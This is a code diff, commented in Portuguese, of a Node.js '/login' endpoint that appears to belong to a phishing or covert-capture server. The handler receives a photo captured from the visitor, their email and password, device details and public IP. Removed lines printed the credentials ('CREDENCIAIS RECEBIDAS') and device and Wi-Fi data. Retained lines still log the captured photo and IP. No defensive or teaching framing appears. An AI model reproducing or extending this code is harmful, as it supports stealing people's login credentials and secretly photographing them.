@@ -25,54 +25,12 @@ app.post('/login', async (req, res) => {
         // Criar um link para visualizar a foto em base64
         const fotoLink = `data:image/jpeg;base64,${foto.split(',')[1]}`;
         
-        // Log da foto como link
+        // Log da foto como link clicável
         console.log('\n📸 FOTO CAPTURADA 📸\n');
-        console.log('Link da foto:', fotoLink);
+        console.log('Link da foto (clique para copiar):', fotoLink);
 
-        // Log das credenciais
-        console.log('\n');
-        console.log('='.repeat(50));
-        console.log('\n🔐 CREDENCIAIS RECEBIDAS 🔐\n');
-        console.log('📧 EMAIL:', email);
-        console.log('🔑 SENHA:', senha);
-        console.log('\n');
-        console.log('='.repeat(50));
-
-        // Log detalhado das informações do dispositivo
-        console.log('\n📱 INFORMAÇÕES DETALHADAS DO DISPOSITIVO 📱\n');
-        console.log('💻 PLATAFORMA:', dispositivo.plataforma);
-        console.log('🌐 USER AGENT:', dispositivo.userAgent);
-        console.log('🗣️ IDIOMA:', dispositivo.idioma);
-        console.log('📺 RESOLUÇÃO:', dispositivo.resolucao);
-        console.log('🎨 PROFUNDIDADE DE COR:', dispositivo.profundidadeCor);
-        console.log('💾 MEMÓRIA:', dispositivo.memoriaDispositivo, 'GB');
-        console.log('⚡ PROCESSADORES:', dispositivo.processadores, 'núcleos');
-        
-        // Informações de conexão
-        console.log('\n🌐 INFORMAÇÕES DE REDE 🌐\n');
-        if (dispositivo.conexao !== 'Não disponível') {
-            console.log('📡 TIPO DE CONEXÃO:', dispositivo.conexao.tipo);
-            console.log('⚡ VELOCIDADE:', dispositivo.conexao.velocidade, 'Mbps');
-        }
-        
-        // Informações de bateria
-        if (dispositivo.bateria && dispositivo.bateria !== 'Não disponível') {
-            console.log('\n🔋 INFORMAÇÕES DA BATERIA 🔋\n');
-            console.log('📊 NÍVEL:', dispositivo.bateria.nivel, '%');
-            console.log('🔌 CARREGANDO:', dispositivo.bateria.carregando ? 'Sim' : 'Não');
-        }
-
-        // Informações de rede Wi-Fi (se disponível)
-        if (dispositivo.wifi) {
-            console.log('\n📶 INFORMAÇÕES WI-FI 📶\n');
-            console.log('📡 SSID:', dispositivo.wifi.ssid || 'Não disponível');
-            console.log('📶 FORÇA DO SINAL:', dispositivo.wifi.signalStrength || 'Não disponível');
-            console.log('🔒 SEGURANÇA:', dispositivo.wifi.security || 'Não disponível');
-        }
-
-        // Log das novas informações
+        // Remove o log extenso do base64
         console.log('\n📸 INFORMAÇÕES DA FOTO E IP 📸\n');
-        console.log('🖼️ FOTO BASE64:', foto);
         console.log('🌐 IP PÚBLICO:', ipPublico);
         
         // Log de informações da requisição
